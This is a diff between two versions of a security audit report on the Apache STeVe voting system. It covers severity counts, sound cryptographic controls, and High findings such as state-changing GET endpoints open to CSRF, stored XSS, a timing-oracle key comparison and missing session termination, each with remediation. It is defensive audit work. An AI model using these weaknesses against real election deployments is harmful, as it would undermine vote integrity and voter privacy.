@@ -1,11 +1,11 @@
 # Security Audit Consolidated Report
 
-## Apache STeVe (Voting Tool) — ASVS L3 Assessment
+## Apache STeVe Election System — ASVS L3 Assessment
 
 ---
 
 
-> **Note:** 9 Critical findings have been redacted from this report and forwarded to the project's PMC private mailing list.
+> **Note:** 7 Critical findings have been redacted from this report and forwarded to the project's PMC private mailing list.
 
 
 ## Report Metadata
@@ -13,863 +13,629 @@
 | Field | Value |
 |-------|-------|
 | **Repository** | `apache/tooling-runbooks` |
-| **ASVS Level** | L3 (Maximum) |
+| **ASVS Level** | L3 |
 | **Severity Threshold** | None (all findings included) |
 | **Commit** | N/A |
 | **Date** | May 06, 2026 |
 | **Auditor** | Tooling Agents |
 | **Source Reports** | 345 |
-| **Total Findings** | 310 | ---
+| **Total Findings** | 286 |
+
+---
 
 ## Executive Summary
+
+This report consolidates the results of a comprehensive ASVS Level 3 security audit across 15 security domains of the Apache STeVe election management system. The assessment evaluated source code, configuration, architecture, and deployment artifacts against the OWASP Application Security Verification Standard at its most rigorous level.
 
 ### Severity Distribution
 
 | Severity | Count | Percentage |
-|----------|------:|----------:|
-| **Critical** | 9 | 2.9% |
-| **High** | 70 | 22.6% |
-| **Medium** | 155 | 50.0% |
-| **Low** | 76 | 24.5% |
-| **Informational** | 0 | 0.0% |
-| **Total** | **310** | **100%** | ### ASVS Level Coverage
+|----------|------:|:----------:|
+| 🟠 High | 67 | 23.4% |
+| 🟡 Medium | 141 | 49.3% |
+| 🔵 Low | 70 | 24.5% |
+| ⚪ Informational | 1 | 0.3% |
+| **Total** | **279** | **100%** |
 
-Findings were identified across all three ASVS verification levels within the audit scope:
+The finding distribution reveals a system with **fundamental architectural security gaps** at the Critical and High tiers, compounded by extensive control incompleteness at the Medium tier. The concentration of 74 findings (25.9%) at Critical or High severity indicates systemic deficiencies in authentication, authorization, session management, and transport security that require immediate remediation.
 
-| Level | Findings Applicable | Description |
-|-------|-------------------:|-------------|
-| **L1** | 98 | Opportunistic — baseline controls expected of all applications |
-| **L2** | 213 | Standard — appropriate for applications handling sensitive data |
-| **L3** | 134 | Advanced — required for high-value applications (elections, critical infrastructure) | > **Note:** Many findings apply to multiple levels simultaneously (e.g., a Critical finding at L1, L2, L3 is counted in each row above). The application is assessed against L3 requirements given its function as an election/voting system for the Apache Software Foundation.
+### ASVS Level Coverage
 
-### Directories Assessed
+| Level | Findings Triggered | Assessment |
+|-------|-------------------:|------------|
+| **L1** (Baseline) | 89 | Significant gaps in foundational controls including input validation, XSS prevention, TLS enforcement, and basic session management |
+| **L2** (Standard) | 198 | Widespread deficiencies in OAuth/OIDC security, logging, cryptographic management, header security, and business logic validation |
+| **L3** (Advanced) | 83 | Expected gaps in hardware security modules, post-quantum readiness, memory protection, and advanced isolation — but also missing controls expected at this tier such as step-up authentication and continuous verification |
 
-23 security domains were evaluated spanning the full application stack:
-
-`api_endpoints` · `tls_configuration` · `deployment_and_configuration_hardening` · `secrets_and_configuration_management` · `tallying_and_admin_operations` · `web_page_rendering_and_output_encoding` · `session_management` · `password_and_credential_security` · `token_and_assertion_validation` · `dependency_and_component_security` · `http_security_headers_and_browser_protection` · `data_privacy_and_anonymity` · `asf_oauth_ldap_authentication` · `vote_encryption_and_storage` · `database_security_and_integrity` · `csrf_and_state_changing_operations` · `file_upload_and_handling` · `rate_limiting_and_resource_protection` · `general_security` · `logging_and_monitoring` · `input_validation_and_business_logic` · `injection_prevention` · `election_authorization_and_access_control`
+> **Note:** Many findings span multiple levels, indicating controls that are absent from the most basic tier upward.
 
 ### Top 5 Risks
 
-The following findings represent the most severe threats to the application's integrity, confidentiality, and availability — particularly concerning given its role as an election system:
-
 | # | Finding | Severity | Risk Summary |
 |---|---------|----------|--------------|
-| 1 | ****: Election Management Authorization Controls Defined But Never Enforced | **Critical** | Authorization logic exists in code but is never invoked, meaning any authenticated ASF member can create, modify, open, close, or delete any election regardless of ownership. This fundamentally undermines the integrity of the voting system. |
-| 2 | ****: CSRF Token is a Hardcoded Placeholder — No Server-Side Validation Exists | **Critical** | The CSRF token is a static string with no server-side verification. Combined with  (state-changing GET endpoints), an attacker can forge requests that create elections, cast votes, or alter election state via simple link injection. |
-| 3 | ****: Election State Enforcement Uses Python `assert` Statements That Can Be Disabled | **Critical** | Critical election lifecycle guards (e.g., preventing voting on closed elections, preventing deletion of open elections) use Python `assert` statements, which are stripped entirely when Python runs with optimization flags (`-O` or `PYTHONOPTIMIZE=1`). |
-| 4 | ****: Stored XSS in JavaScript Context — STV Candidates Object | **Critical** | Candidate names from the database are injected directly into a JavaScript object literal without encoding, enabling stored cross-site scripting that executes in every voter's browser session when viewing STV ballots. |
-| 5 | ****: Vote String Has No Validation Against Vote Type Rules | **Critical** | Vote submissions are accepted and encrypted without any validation that the vote content conforms to the election's declared vote type (YNA, STV, etc.), allowing storage of arbitrary data that could corrupt tallying or exploit downstream processing. | **Systemic Observation:** The Critical findings cluster around two architectural gaps: (1) authorization controls that are defined but never called, and (2) input/state validation that relies on mechanisms inappropriate for production (hardcoded tokens, `assert` statements, missing server-side checks). These are not complex exploitation scenarios — they represent fundamental control absences exploitable by any authenticated user or via basic CSRF attacks.
+| 4 | **FINDING-051**: TLS Configuration is Optional — Application Allows Plaintext HTTP | 🟠 High | The application can operate over unencrypted HTTP with no enforcement mechanism. Combined with the absence of HSTS (FINDING-038/044), session tokens, OAuth credentials, and vote data may transit in cleartext. |
 
-### Positive Security Controls
+**Compounding Factor:** These top risks interact synergistically. The BOLA vulnerability () combined with the CSRF bypass () means an unauthenticated attacker could potentially manipulate elections by forging requests from any authenticated user's browser. The absence of security event logging (FINDING-065) means such attacks would leave no audit trail.
 
-Despite the significant findings above, the audit identified meaningful security controls that demonstrate intentional security design in the cryptographic and data-access layers:
+### Positive Controls Identified
 
-| Domain | Control | Evidence |
-|--------|---------|----------|
-| **Vote Encryption** | Well-designed multi-level key derivation chain | `election_data → BLAKE2b → Argon2 → opened_key → (+ pid + iid + salt) → Argon2 → vote_token → HKDF → vote_key → Fernet(vote)` provides strong key separation between elections, issues, and voters |
-| **Vote Privacy** | Voter–vote unlinkability architecture | Vote tokens are derived (not stored), votes are encrypted immediately upon submission, and decrypted votes are cryptographically shuffled before output during tallying |
-| **Cryptographic Foundations** | Industry-validated libraries with CSPRNG | Uses `cryptography` (Fernet), `argon2-cffi`, `hashlib.blake2b`, and `secrets` module — no deprecated algorithms (MD5/SHA-1 absent), no ECB mode, fresh IV per encryption |
-| **SQL Injection Prevention** | Complete parameterization with no dynamic SQL | All 30+ queries defined in `queries.yaml` with `?` placeholders; no string concatenation, f-strings, or format strings used to construct SQL anywhere in the codebase |
-| **Data Minimization** | Explicit sensitive field filtering | `get_metadata()` and `get_issue()` use allowlists to strip cryptographic material; `q_open_to_me` query explicitly excludes `SALT` and `OPENED_KEY`; logging never includes key material |
-| **Integrity Verification** | Election tamper detection via `opened_key` | Argon2 hash of all election structural data enables detection of unauthorized modifications to election configuration |
-| **Key Hygiene** | No hardcoded secrets; deferred key generation | Configuration contains no secret material; cryptographic keys are generated only when an election transitions to the "open" state, minimizing exposure window | **Assessment:** The cryptographic layer and database access patterns reflect strong security engineering. However, the application's web layer, authorization enforcement, session management, and operational security controls (logging, headers, rate limiting) have not received equivalent attention. The resulting posture is one where vote *content* is well-protected cryptographically, but the *processes* surrounding elections (who can create/modify/tally them, and under what conditions) lack enforceable controls.
+Despite the significant findings, the audit identified several well-designed security controls demonstrating architectural security awareness:
+
+| Category | Controls | Assessment |
+|----------|----------|------------|
+| **Cryptographic Architecture** | Centralized crypto module; CSPRNG via `secrets.token_bytes()`; multi-level key derivation (BLAKE2b → Argon2 → opened_key); per-voter-per-issue salts; immediate vote encryption; Fernet encrypt-then-MAC preventing padding oracle attacks; random IV per encryption; vote shuffling before output | **Strong.** The cryptographic design demonstrates expert-level understanding of vote secrecy requirements. No homebrew primitives; all operations use peer-reviewed libraries. |
+| **Credential Protection** | `get_metadata()` explicitly excludes `salt` and `opened_key`; SQL queries for external data select only safe columns; no tokens in template variables; server-side-only token handling | **Strong.** Defense-in-depth approach to preventing cryptographic material leakage to clients. |
+| **Authorization Architecture** | `@asfquart.auth.require` decorator on all protected endpoints; role differentiation (committer vs. pmc_member); per-endpoint authorization declarations; voter eligibility verification; per-document access control | **Partial.** The framework provides authentication enforcement, but object-level authorization within endpoints remains incomplete (see FINDING-011). |
+| **OAuth/Session Design** | Authorization code flow (not implicit); server-side backchannel token exchange; state parameter for CSRF protection; HTTPS for all OAuth communication; session-based architecture with cookie constraints | **Adequate foundation.** Core OAuth flow is correctly structured, though missing PKCE, nonce, and audience validation at the application layer. |
+| **Database Schema Constraints** | CHECK constraints enforce key lengths (16-byte salt, 32-byte opened_key, 32-byte vote_token); library version pinning with upper bounds | **Good.** Schema-level enforcement provides defense-in-depth for cryptographic material integrity. |
+
+**Summary Assessment:** The application demonstrates strong cryptographic engineering for vote secrecy but has critical gaps in web application security fundamentals (CSRF, XSS, authorization, session management, TLS enforcement, and security logging). The security posture suggests a development focus on election integrity mathematics without equivalent attention to the web security envelope protecting those operations.
 
 ---
 
 ## 3. Findings
 
-## 3.2 High
+### 3.2 High
 
-#### FINDING-010: No Crypto Agility - Algorithms Hardcoded Without Abstraction or Versioning
+#### FINDING-008: No Crypto Agility - Algorithms Hardcoded Without Abstraction or Versioning
 
 | Attribute | Value |
 |-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS sections | 11.2.2 |
-| Files | v3/steve/crypto.py (entire file), v3/schema.sql |
-| Source Reports | 11.2.2.md |
-| Related | - | **Description:**
+| **Severity** | 🟠 High |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 11.2.2 |
+| **Files** | v3/steve/crypto.py (entire file), v3/schema.sql (N/A) |
+| **Source Reports** | 11.2.2.md |
+| **Related Findings** | None |
 
-The application has no crypto-agility design. Specific issues: 1. No algorithm abstraction layer: All crypto operations directly call specific implementations with hardcoded parameters. There's no configuration, registry, or strategy pattern that would allow swapping algorithms. 2. No algorithm versioning in stored data: The vote table stores ciphertext without any algorithm identifier. When transitioning from Fernet to XChaCha20-Poly1305, there will be no way to determine which algorithm was used for existing ciphertext without external tracking. 3. No key versioning: If keys need to be rotated or algorithms changed, there's no version field to indicate which key/algorithm generated a given ciphertext. 4. No re-encryption mechanism: No tooling exists to decrypt existing votes with the old algorithm and re-encrypt with a new one. 5. Fixed key lengths in schema: Database CHECK constraints enforce exact lengths (length(vote_token) = 32, length(opened_key) = 32, length(salt) = 16), preventing algorithm changes that require different sizes without schema migration.
+**Description:**
+
+The application has no crypto-agility design. Specific issues: (1) No algorithm abstraction layer - all crypto operations directly call specific implementations with hardcoded parameters. There's no configuration, registry, or strategy pattern that would allow swapping algorithms. (2) No algorithm versioning in stored data - the vote table stores ciphertext without any algorithm identifier. When transitioning from Fernet to XChaCha20-Poly1305, there will be no way to determine which algorithm was used for existing ciphertext without external tracking. (3) No key versioning - if keys need to be rotated or algorithms changed, there's no version field to indicate which key/algorithm generated a given ciphertext. (4) No re-encryption mechanism - no tooling exists to decrypt existing votes with the old algorithm and re-encrypt with a new one. (5) Fixed key lengths in schema - database CHECK constraints enforce exact lengths (length(vote_token) = 32, length(opened_key) = 32, length(salt) = 16), preventing algorithm changes that require different sizes without schema migration.
 
 **Remediation:**
 
-1. Add algorithm version to stored ciphertext: CREATE TABLE vote (vid INTEGER PRIMARY KEY AUTOINCREMENT, vote_token BLOB NOT NULL, crypto_version INTEGER NOT NULL DEFAULT 1, ciphertext BLOB NOT NULL) STRICT; 2. Implement a crypto abstraction layer with CRYPTO_VERSIONS dictionary mapping version numbers to algorithm configurations, and update create_vote() and decrypt_votestring() functions to accept and use version parameters. 3. Provide a re-encryption utility for migration.
+1. Add algorithm version to stored ciphertext: CREATE TABLE vote (vid INTEGER PRIMARY KEY AUTOINCREMENT, vote_token BLOB NOT NULL, crypto_version INTEGER NOT NULL DEFAULT 1, ciphertext BLOB NOT NULL) STRICT; 2. Implement a crypto abstraction layer with CRYPTO_VERSIONS dictionary mapping version numbers to algorithm configurations (kdf, hash, encrypt, key_stretch). 3. Modify create_vote() to return (version, ciphertext) tuple and decrypt_votestring() to accept version parameter. 4. Provide a re-encryption utility for migration.
 
 ---
 
-#### FINDING-011: Non-constant-time comparison in tamper check allows timing oracle
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS sections | 11.2.4 |
-| Files | v3/steve/election.py (331) |
-| Source Reports | 11.2.4.md |
-| Related | - | **Description:**
-
-Python's `!=` operator on `bytes` objects performs a short-circuit comparison that returns `False` as soon as the first differing byte is found. An attacker who can observe response timing could potentially determine how many leading bytes of the `opened_key` match, gradually reconstructing the stored key. The `opened_key` is derived from election data and serves as the anti-tamper seal; leaking it could allow an attacker to forge tamper checks.
-
-**Remediation:**
-
-Replace the `!=` comparison with `hmac.compare_digest()` to ensure constant-time comparison. Change `return opened_key != md.opened_key` to `return not hmac.compare_digest(opened_key, md.opened_key)` after importing `hmac`.
-
----
-
-#### FINDING-012: No Secrets Management Solution (Key Vault) Integration
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2, L3 |
-| CWE | - |
-| ASVS sections | 13.3.1, 13.3.3 |
-| Files | v3/steve/crypto.py (entire module), v3/steve/election.py (75-85), v3/schema.sql (election table) |
-| Source Reports | 13.3.1.md, 13.3.3.md |
-| Related | - | **Description:**
-
-All cryptographic operations (key derivation, encryption, decryption, hashing) are performed directly in the application process. Key material is derived in application memory, exists as Python bytes objects on the heap, and is accessible to any code running in the same process (or an attacker who achieves memory read access). There is no isolation boundary — no HSM, no separate vault process, no TEE, and no software enclave protecting key material during use. For an L3 application, this is particularly concerning as ASVS 13.3.3 requires an isolated security module to prevent key exposure. Data flow: vote_token + salt → _b64_vote_key() → derived key in Python heap → Fernet object → encryption/decryption in same process.
-
-**Remediation:**
-
-Integrate a secrets management solution such as HashiCorp Vault, AWS KMS, or Azure Key Vault to store election salts and opened_keys outside the application database. Example implementation provided using HashiCorp Vault with KV secrets engine and AppRole authentication. At minimum, use Vault's KV secrets engine for secret storage with ACL policies per election. Add key lifecycle metadata with key_created_at and key_version columns to enable future rotation and audit capabilities. Implement secret destruction for closed elections by adding an archive_election() method that zeros out cryptographic material after a defined retention period. For L3 ASVS compliance, integrate a hardware security module (PKCS#11 interface or cloud HSM) for key generation and cryptographic operations.
-
----
-
-#### FINDING-013: Single Database File Provides Unrestricted Access to All Secrets
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS sections | 13.3.2 |
-| Files | v3/steve/election.py (40), v3/schema.sql |
-| Source Reports | 13.3.2.md |
-| Related | - | **Description:**
-
-The SQLite architecture stores all cryptographic secrets (election salts, opened_keys, per-voter salts) in the same database file as non-sensitive metadata (titles, person names, emails). Any process or user with read access to the database file can extract all secrets. There is no row-level or column-level access control, and no separation between the secret store and the application data store. Any code path with db_fname can obtain full read/write access to election.salt, election.opened_key, mayvote.salt, and vote.ciphertext. The tally_issue method demonstrates that any caller who reaches it can decrypt ALL votes for an issue without additional per-secret access control.
-
-**Remediation:**
-
-1. Separate secret material into a distinct storage mechanism with independent access controls. 2. Implement application-level access control that verifies the caller's authorization before exposing per-voter salts. 3. Consider encrypting the salt columns with a master key managed by a vault. Implement a SecretAccessLayer class that mediates access to cryptographic secrets with least privilege, restricting access to election keys to admin/tally roles only and voter salts to the specific voter or tally role.
-
----
-
-#### FINDING-014: No Expiration or Rotation Mechanism for Cryptographic Secrets
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS sections | 13.3.4 |
-| Files | v3/schema.sql (election and mayvote tables), v3/steve/election.py (75-140) |
-| Source Reports | 13.3.4.md |
-| Related | - | **Description:**
-
-Once generated, cryptographic secrets (election salts, opened_keys, per-voter salts) persist indefinitely in the database with no expiration timestamp or TTL, key versioning mechanism, rotation procedure, or scheduled re-keying. For long-running elections or elections that remain in storage after closure, cryptographic material ages without replacement. If a key is compromised, there is no rotation mechanism to limit exposure.
-
-**Remediation:**
-
-Add expiration and versioning to schema by extending the election table with key_version, key_created_at, and key_expires_at columns. Implement a rotate_encryption_keys() method that rotates election keys if expired and re-encrypts all votes with new key material, updating key metadata including version, created_at, and expires_at timestamps.
-
----
-
-#### FINDING-015: No data retention mechanism — opened/closed elections cannot be deleted
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L3 |
-| CWE | - |
-| ASVS sections | 14.2.7 |
-| Files | v3/steve/election.py (60-77) |
-| Source Reports | 14.2.7.md |
-| Related | - | **Description:**
-
-Once an election is opened, it can NEVER be deleted through the application. The `assert self.is_editable()` check prevents deletion of opened or closed elections. This means: All voter eligibility data (mayvote table with PIDs) persists indefinitely, All encrypted votes persist indefinitely, All person records (emails, names) persist indefinitely. There is no automated cleanup, TTL, or scheduled purge mechanism. For elections containing sensitive data (voter identities, participation records), indefinite retention without a defined schedule violates data minimization principles and potentially GDPR/privacy regulations requiring time-bounded retention. After an election is closed and tallied, calling `Election(db, eid).delete()` raises `AssertionError` — the data is permanently locked in the database.
-
-**Remediation:**
-
-Implement a purge method that allows deletion of closed elections after a retention period. The method should check that the election is closed, verify the retention period has expired, and then delete votes, mayvote records, issues, and the election record in a transaction. Example implementation: `def purge(self, retention_days=None)` that asserts the election is closed, checks the retention period against close_at timestamp, and performs cascading deletes of all related data.
-
----
-
-#### FINDING-016: Missing Strong Client Authentication for OAuth Token Endpoint
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2, L3 |
-| CWE | - |
-| ASVS sections | 10.4.10, 10.4.16 |
-| Files | v3/server/main.py (39-42) |
-| Source Reports | 10.4.10.md, 10.4.16.md |
-| Related | - | **Description:**
-
-The token endpoint callback URL format 'https://oauth.apache.org/token?code=%s' only passes the authorization code via query parameter. There is no evidence of: client_assertion parameter (required for private_key_jwt), client_assertion_type parameter, Mutual TLS configuration for client certificate authentication (tls_client_auth or self_signed_tls_client_auth), or any client_id or client_secret being injected into the token request. The create_app() function initializes the application but does not configure any strong client authentication mechanism. While the asfquart framework may inject credentials internally, the URL format token?code=%s with a single format specifier suggests only the code is passed. Without strong client authentication (mutual TLS or private_key_jwt), the client cannot be verified as confidential. This weakens the security of the authorization code exchange, potentially allowing code injection or replay by unauthorized parties.
-
-**Remediation:**
-
-Configure client authentication using private_key_jwt or mTLS. For private_key_jwt: Create a client assertion function that generates a JWT signed with the client's private key, including claims for iss, sub, aud, iat, exp, and jti. For mTLS: Configure the HTTP client with client certificate using ssl_context.load_cert_chain(certfile='client.pem', keyfile='client_key.pem'). Ensure the asfquart framework sends client credentials with token requests. Example using client_secret_post: Set OAUTH_URL_CALLBACK to 'https://oauth.apache.org/token' and include in the token request body: code=&lt;code&gt;&client_id=&lt;id&gt;&client_secret=&lt;secret&gt;&grant_type=authorization_code. Preferably, use private_key_jwt or mTLS for client authentication.
-
----
-
-#### FINDING-017: Missing ID Token Audience (aud) Claim Validation
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | CWE-345 |
-| ASVS sections | 10.5.4, 9.2.4 |
-| Files | v3/server/main.py (35-49) |
-| Source Reports | 10.5.4.md, 9.2.4.md |
-| Related | - | **Description:**
-
-The code explicitly overrides the asfquart framework's default OAuth/OIDC configuration (which presumably includes proper OIDC flows with audience validation). The comment 'Avoid OIDC' and the uncertain 'is this really needed right now?' suggest this was done as a quick workaround rather than a deliberate security decision. OIDC provides built-in audience restriction via: ID Token aud claim (MUST contain client_id per spec), token endpoint client authentication, and standardized token validation procedures. By bypassing OIDC, the application loses these protections that directly satisfy ASVS 9.2.4, creating a false sense of security since the asfquart.auth.require decorator appears to work but doesn't validate audience claims.
-
-**Remediation:**
-
-Configure client_id for audience validation and ensure token validation checks audience. Example implementation: def create_app(): import asfquart.generics; CLIENT_ID = 'steve-voting-app'; asfquart.generics.OAUTH_URL_INIT = (f'https://oauth.apache.org/auth?client_id={CLIENT_ID}&state=%s&redirect_uri=%s'); asfquart.generics.OAUTH_URL_CALLBACK = 'https://oauth.apache.org/token?code=%s'; app = asfquart.construct('steve', app_dir=THIS_DIR, static_folder=None); app.config['OAUTH_CLIENT_ID'] = CLIENT_ID; # In token validation callback: assert id_token['aud'] == CLIENT_ID
-
----
-
-#### FINDING-018: Inconsistent Authentication Strength Between Election Creation and Management
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | CWE-863 |
-| ASVS sections | 6.3.4 |
-| Files | v3/server/pages.py |
-| Source Reports | 6.3.4.md |
-| Related | - | **Description:**
-
-The application enforces a higher privilege level (R.pmc_member) for creating elections than for managing them (R.committer). This inconsistency means a lower-privileged user (committer, not PMC member) can perform more impactful operations such as opening/closing elections and modifying issues, which is a gap in authentication pathway consistency where different pathways to affect election state have different strength requirements.
-
-**Remediation:**
-
-Ensure management operations require at least the same privilege level as creation, or implement proper owner-based authorization checking. Management operations should either require R.pmc_member status or implement the owner/authz checks to ensure consistent security controls.
-
----
-
-#### FINDING-019: State-Changing Operations Use GET Method, Bypassing CSRF and Browser Security Mechanisms
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | CWE-352 |
-| ASVS sections | 6.3.4 |
-| Files | v3/server/pages.py |
-| Source Reports | 6.3.4.md |
-| Related | FINDING-138 | **Description:**
-
-The do-open and do-close endpoints use GET methods for state-changing operations. This allows these operations to be triggered by any cross-origin reference such as img tags, link prefetch, or other browser mechanisms. Combined with the lack of authorization checks, this creates an undocumented pathway where elections can be manipulated without the user even visiting the application, simply by loading a malicious image or link.
-
-**Remediation:**
-
-Change state-modifying operations to POST methods and implement proper CSRF protection. Example: @APP.post('/do-open/&lt;eid&gt;') @asfquart.auth.require({R.committer}) @load_election async def do_open_endpoint(election): await verify_csrf_token(); await check_election_authz(election, (await basic_info()).uid); election.open(pdb); ...
-
----
-
-#### FINDING-020: Vote Submission Lacks Explicit Voter Eligibility Check
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L1, L2 |
-| CWE | CWE-285 |
-| ASVS sections | 8.2.2, 8.3.1, 2.2.3 |
-| Files | v3/server/pages.py (407-430), v3/steve/election.py (254-268) |
-| Source Reports | 8.2.2.md, 8.3.1.md, 2.2.3.md |
-| Related | - | **Description:**
-
-The do_vote_endpoint function lacks an explicit voter eligibility check before processing votes. Authorization relies on an implicit side-effect where add_vote() throws an AttributeError when accessing mayvote.salt if mayvote is None (when q_get_mayvote.first_row() returns no result). This is a Type C gap where the control (mayvote lookup) is called but its result isn't explicitly validated before use. The pattern is fragile and could be silently broken by code refactoring (e.g., adding a default value to mayvote.salt). While the generic error message prevents information leakage, the lack of explicit authorization checking violates secure coding principles.
-
-**Remediation:**
-
-In the add_vote() method in election.py, add explicit eligibility check immediately after q_get_mayvote.first_row(pid, iid): if mayvote is None: raise NotEligibleToVote(f'User {pid} not eligible to vote on issue {iid}'). Define custom NotEligibleToVote exception class. This makes the authorization check explicit and intentional rather than relying on implicit AttributeError. Update do_vote_endpoint to catch NotEligibleToVote and return appropriate 403 response with clear error message.
-
----
-
-#### FINDING-021: Management Endpoints Expose Sensitive Election Metadata Without Authorization
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2, L3 |
-| CWE | CWE-639 |
-| ASVS sections | 8.2.3, 8.4.2 |
-| Files | v3/server/pages.py (343-363), v3/server/pages.py (193) |
-| Source Reports | 8.2.3.md, 8.4.2.md |
-| Related | FINDING-022, FINDING-109, FINDING-110 | **Description:**
-
-The manage_page endpoint exposes sensitive election metadata fields (owner_pid, authz LDAP group, issue kv data including STV candidate lists and seat counts) to any authenticated committer without verifying ownership or authorization. Any authenticated committer can view election configuration for any election by knowing or guessing the 10-character hex EID. This results in unauthorized field-level data exposure including: authz LDAP group name (reveals organizational structure), owner_pid (reveals election administrator identity), issue kv data (reveals STV candidate lists, seat counts before election opens), and full issue titles and descriptions (potentially confidential ballot topics). This violates field-level access control requirements (BOPLA).
-
-**Remediation:**
-
-Add await check_election_authz(election, result.uid) to manage_page and manage_stv_page immediately after basic_info() call and before displaying any election data. Implement is_authorized_manager() function that validates user's uid against md.owner_pid and md.authz LDAP group membership. Return 403 Forbidden if not authorized. This ensures backend authorization enforcement matches UI-level filtering and prevents information disclosure through direct URL navigation.
-
----
-
-#### FINDING-022: Shared Database Without Tenant-Level Data Isolation
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | CWE-639 |
-| ASVS sections | 8.4.1 |
-| Files | v3/schema.sql, v3/steve/election.py (list_closed_election_ids) |
-| Source Reports | 8.4.1.md |
-| Related | FINDING-021, FINDING-109, FINDING-110 | **Description:**
-
-All elections for all organizational groups (tenants) share a single SQLite database (steve.db) with no row-level security. The authz field provides logical tenancy, but query methods like list_closed_election_ids() return ALL elections without tenant filtering. The method has no tenant parameter, meaning any code calling it gets cross-tenant data. While CLI access to all elections is documented as intentional for administrative purposes, the lack of tenant filtering in query methods means administrative functions have access to ALL elections across all tenant boundaries without explicit authorization checks or audit trails.
-
-**Remediation:**
-
-Add tenant filtering to list_closed_election_ids() method by adding an authz_filter parameter. When authz_filter is provided, use a query that filters by the authz group (e.g., q_closed_election_ids_by_authz = 'SELECT eid FROM election WHERE state = ? AND authz = ? ORDER BY close_at DESC'). Only allow unfiltered access for admin CLI operations with explicit authorization and audit logging. Apply similar tenant filtering to any other cross-election queries used by the web interface. Document which functions are intentionally cross-tenant for administrative purposes.
-
----
-
-#### FINDING-023: No Absolute Maximum Session Lifetime Enforced
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS sections | 7.3.2 |
-| Files | v3/server/pages.py (entire file) |
-| Source Reports | 7.3.2.md |
-| Related | - | **Description:**
-
-The application code contains no absolute session lifetime limit, no session creation timestamp stored in session data, no validation of session age before granting access, and no documented security decision regarding maximum session lifetime. User authenticates, session is created with no creation timestamp, session is used over days/weeks/months, no absolute expiration is enforced, and session remains valid permanently as long as it exists. For an election system where elections have defined open/close periods, a session that outlives an election's lifecycle could allow unintended access patterns. A compromised session token could be used indefinitely by an attacker. Even if a user changes their password or credentials are rotated, the existing session may remain valid. This is particularly concerning for election management operations where election states are time-sensitive.
-
-**Remediation:**
-
-Implement absolute session lifetime enforcement: 1) Add SESSION_MAX_LIFETIME configuration (e.g., 8 hours), 2) Store session creation timestamp in session data (session['created_at'] = time.time()), 3) Validate session age in basic_info() or middleware before granting access, 4) Destroy session and return 401 if session exceeds maximum lifetime, 5) Document security decision regarding chosen lifetime value based on risk analysis.
-
----
-
-#### FINDING-024: No logout endpoint exists - users cannot terminate sessions
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L1, L3 |
-| CWE | - |
-| ASVS sections | 7.4.1, 6.5.6 |
-| Files | v3/server/pages.py (entire routes list) |
-| Source Reports | 7.4.1.md, 6.5.6.md |
-| Related | - | **Description:**
-
-The application defines 21 routes across GET and POST methods, but NONE of them implement session termination functionality. There is no /logout endpoint, no session destruction call (asfquart.session.destroy() or equivalent), and no mechanism to invalidate sessions on expiration. Users cannot actively terminate their sessions. If a user accesses the system from a shared computer, the next user can access election management features. Combined with the absence of timeouts (7.3.1, 7.3.2), sessions effectively persist indefinitely. This is a Type A gap — the entry point (logout) does not exist at all.
-
-**Remediation:**
-
-Implement a logout endpoint that destroys the session on the backend and clears the session cookie:
-
-```python
-@APP.get('/logout')
-@APP.post('/logout')
-async def logout():
-    """Terminate the user's session."""
-    # Destroy the session on the backend
-    await asfquart.session.destroy()
-    
-    # Clear session cookie
-    response = quart.redirect('/', code=303)
-    response.delete_cookie('session')
-    
-    _LOGGER.info(f'User logged out')
-    return response
-```
-
----
-
-#### FINDING-025: No session termination when user account is deleted or disabled
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L1 |
-| CWE | - |
-| ASVS sections | 7.4.2 |
-| Files | v3/queries.yaml (c_delete_person query definition), election.py (no session termination on person operations), pages.py (no endpoint or logic to terminate sessions on account disable/delete) |
-| Source Reports | 7.4.2.md |
-| Related | - | **Description:**
-
-The system has a c_delete_person SQL query defined in queries.yaml but no application-level code that terminates sessions when a person is deleted. There is no session store indexed by person ID (PID) for bulk invalidation, no mechanism to link active sessions to person records, and no disabled flag in the person table schema for soft-disabling accounts. When a person's account is deleted (e.g., they leave the organization), their active sessions continue to work, allowing them to continue to vote, manage elections, or access sensitive election data until their session naturally expires.
-
-**Remediation:**
-
-Implement delete_person function that first terminates all active sessions for the user (via terminate_all_sessions_for_user) before deleting the person record. Add session-to-user mapping in session store to enable bulk invalidation by user ID. For server-side sessions, use DELETE FROM sessions WHERE user_id = ?. For JWTs, add PID to revocation list or update per-user invalidation timestamp. Log all person deletions and session terminations.
-
----
-
-#### FINDING-026: No administrative capability to terminate active sessions
-
-| Attribute | Value |
-|-----------|-------|
-| Severity | 🟠 High |
-| ASVS Level(s) | L2 |
-| CWE | - |
-| ASVS sections | 7.4.5 |
-| Files | v3/server/pages.py (279) |
